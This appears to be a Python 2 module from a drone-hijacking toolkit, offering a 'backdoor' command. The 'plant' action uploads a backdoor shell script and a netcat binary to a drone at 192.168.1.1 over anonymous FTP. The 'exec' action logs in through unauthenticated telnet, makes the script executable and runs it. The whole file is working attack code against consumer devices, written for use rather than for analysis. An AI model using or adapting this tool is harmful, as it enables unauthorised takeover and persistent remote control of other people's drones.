import ftplib, os
from telnetlib import Telnet
from lib.parser import SkyjackArgumentParser


class BackdoorCommand():
    def __init__(self):
        self.cmd = "backdoor"
        self.files = ['backdoor.sh', 'nc']
        self.timeout = 5
        self.parser = SkyjackArgumentParser(prog=self.cmd, description="backdoor a drone")
        self.parser.add_argument('-a', '--action', help="plant|exec")

    def execute(self, args):
        "backdoor a drone"
        #wtf that check should be done by the parser
        if args.action == None:
            print 'missing parameter action, see backdoor -h'
            return -1

        try:
            for f in self.files:
                os.stat('./res/' + f)

        except OSError as e:
            print f, ' does not exist in res folder'
            return -1

        if args.action == 'plant':
            self.upload()
        elif args.action == 'exec':
            self.executeBackdoor()
        else:
            print '[-] unknown command: "%s"' % args.action

        return 0

    def upload(self):
        try:
            session = ftplib.FTP('192.168.1.1')  # anonymous
            for file in self.files:
                print '[*] uploading %s' % file
                f = open('./res/' + file, 'rb')
                session.storbinary('STOR ' + file, f)
                f.close()
            session.quit()
        except Exception as e:
            print '[ERROR] ftp upload failed'
            print e.message

        finally:
            return 0


    def executeBackdoor(self):
        try:
            tn = Telnet('192.168.1.1')
            print '[+] connection established'
            tn.read_until('#', self.timeout)

            #make
            self.tcmd('chmod +x /data/video/backdoor.sh', tn)
            self.tcmd('/data/video/backdoor.sh', tn)

        except Exception as e:
            print '[ERROR] telnet command execution failed'
            print e.message

        finally:
            return 0

    def tcmd(self, cmd, tn):
        print '[+] executing %s ' % cmd
        tn.write(cmd + '\n')
        print tn.read_until('#', self.timeout)

        return 0


